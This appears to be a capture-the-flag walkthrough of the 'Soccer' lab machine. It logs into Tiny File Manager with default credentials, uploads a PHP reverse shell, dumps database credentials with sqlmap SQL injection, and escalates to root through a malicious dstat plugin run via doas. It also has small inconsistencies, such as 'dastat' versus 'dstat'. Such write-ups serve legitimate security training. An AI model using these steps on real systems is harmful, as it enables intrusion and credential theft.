A quick `nmap` scan shows port `80` occupied by nginx and port `9091` running an unknown service.

Visiting the ip address in the web browser redirects to `soccer.htb`, si I add that to the hosts file

```
echo "{target_ip} soccer.htb" | sudo tee -a /etc/hosts
```

I do a directory search with `feroxbuster`

```
$ feroxbuster -u http://soccer.htb
                                                                                                                                                                                              
 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.11.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://soccer.htb
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
 👌  Status Codes          │ All Status Codes!
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.11.0
 🔎  Extract Links         │ true
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
404      GET        7l       12w      162c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
403      GET        7l       10w      162c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
200      GET      494l     1440w    96128c http://soccer.htb/ground3.jpg
200      GET     2232l     4070w   223875c http://soccer.htb/ground4.jpg
200      GET      809l     5093w   490253c http://soccer.htb/ground1.jpg
200      GET      711l     4253w   403502c http://soccer.htb/ground2.jpg
200      GET      147l      526w     6917c http://soccer.htb/
301      GET        7l       12w      178c http://soccer.htb/tiny => http://soccer.htb/tiny/
301      GET        7l       12w      178c http://soccer.htb/tiny/uploads => http://soccer.htb/tiny/uploads/

```

I get useful results from the directories `/tiny` and `/tiny/uploads`.

When I visit the directory, there is a login for the software `Tiny File Manager` version `2.4.3`, doing a google search I find that there are default credentials `admin:admin@123`.

After signing in I am able to navigate to `tiny/uploads` and upload the reverse shell `/usr/share/webshells/php/php-reverse-shell.php`. I move the shell to my `/home/trmchale` directory and run `sudo chmod 777` on it, to give it full perms, also I change the ip address to my local box. After running a netcat listener on my local with the ip from the reverse shell, I open the uploaded php shell in the browser through the web application triggering the reverse shell to run and contacting my local listener.

Getting shell access to the victim box, I run `whoami` and I am running the user `www-data`. Visiting the file `/etc/hosts` lists a subdomain:

```
$ cat hosts
127.0.0.1	localhost	soccer	soccer.htb	soc-player.soccer.htb

127.0.1.1	ubuntu-focal	ubuntu-focal
```

I add the subdomain `soc-player.soccer.htb` to my local hosts file and visit it in my web browser.

After some research it is determined that the subdomain is vulnerable to SQL injection. First I runn `sqlmap`

```
sqlmap -u "ws://soc-player.soccer.htb:9091" --data '{"id": "*"}' --dbs --threads 10 --level 5 --risk 3 --batch
```

In which databases are listed, I run a more specific command enumerating the database I want, `soccer_db`

```
sqlmap -u "ws://soc-player.soccer.htb:9091" --data '{"id": "*"}' --threads 10 -D
soccer_db --dump --batch
```

Where I get the credentials `player:PlayerOftheMatch2022`

I run `ssh player@{target ip}` and use the password when prompted to login. After getting user shell access, I run `cat /home/player/user.txt` to get the user flag. 

##### PrivEsc

I run the following command:

```
  $ find / -type f -perm -4000 2>/dev/null
```

This command tells me what files this user can run as root. The first file is `/usr/local/bin/doas`, running:

```
cat /usr/local/etc/doas.conf

permit nopass player as root cmd /usr/bin/dastat
```

Running `man dstat`, I find that this user can execute `dstat` as root, `dstat` can run it's plugins which are of the filename rule `/usr/local/share/dstat/dstat_*.py`. So I echo a python bash shell into a file that fits that rule:

```
$ echo 'import os; os.system("/bin/bash")' > /usr/local/share/dstat/dstat_pwn.py
```

To verify that the plugin is detected by dstat , we run the command with the --list flag.

```
  doas /usr/bin/dstat --list
```

Finally, having confirmed that our plugin is detected, we run dstat and specify the plugin by passing it as a command line argument, using a -- prefix.

```
  $ doas /usr/bin/dstat --pwn
```

Our payload successfully triggered, and we have obtained a shell as root . The final flag can be found at `/root/root.txt`

